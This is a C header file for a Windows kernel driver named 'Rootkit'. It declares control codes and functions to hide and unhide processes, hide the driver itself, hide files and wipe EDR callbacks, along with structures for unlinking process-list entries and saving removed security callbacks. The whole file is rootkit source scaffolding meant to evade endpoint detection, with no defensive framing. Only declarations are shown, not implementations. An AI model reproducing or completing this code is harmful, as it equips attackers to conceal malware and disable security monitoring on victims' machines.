#pragma once

#define NTDDI_VERSION   0x0A000000
#define _WIN32_WINNT    0x0A00
#define WINVER          0x0A00

#include <ntddk.h>
#include <wdm.h>
#include <ntimage.h>

#define ROOTKIT_DEVICE_NAME     L"\\Device\\Rootkit"
#define ROOTKIT_SYMLINK_NAME    L"\\DosDevices\\Rootkit"

#define IOCTL_HIDE_PROCESS      CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_UNHIDE_PROCESS    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_HIDE_DRIVER       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_WIPE_CALLBACKS    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_HIDE_FILE         CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct _OFFSETS {
    ULONG UniqueProcessId;
    ULONG ActiveProcessLinks;
    ULONG ImageFileName;
    ULONG ThreadListHead;
    ULONG Protection;
} OFFSETS, *POFFSETS;

typedef struct _HIDE_PROCESS_REQUEST {
    ULONG ProcessId;
} HIDE_PROCESS_REQUEST, *PHIDE_PROCESS_REQUEST;

typedef struct _HIDE_FILE_REQUEST {
    WCHAR FilePath[260];
} HIDE_FILE_REQUEST, *PHIDE_FILE_REQUEST;

typedef struct _HIDDEN_PROCESS_ENTRY {
    LIST_ENTRY  ListEntry;
    ULONG       ProcessId;
    PLIST_ENTRY PrevFlink;
    PLIST_ENTRY NextBlink;
} HIDDEN_PROCESS_ENTRY, *PHIDDEN_PROCESS_ENTRY;

// saved EDR callbacks so we can restore if needed
typedef struct _SAVED_CALLBACK {
    ULONG  Index;
    PVOID  Callback;
} SAVED_CALLBACK, *PSAVED_CALLBACK;

extern OFFSETS      g_Offsets;
extern LIST_ENTRY   g_HiddenProcessList;
extern KSPIN_LOCK   g_HiddenProcessLock;
extern PDRIVER_OBJECT g_DriverObject;

// explicit declaration for older WDK compat
NTKERNELAPI NTSTATUS PsLookupProcessByProcessId(HANDLE ProcessId, PEPROCESS* Process);

NTSTATUS ResolveOffsets();
NTSTATUS HideProcess(ULONG Pid);
NTSTATUS UnhideProcess(ULONG Pid);
VOID     HideDriver(PDRIVER_OBJECT DriverObject);
VOID     WipeEDRCallbacks();
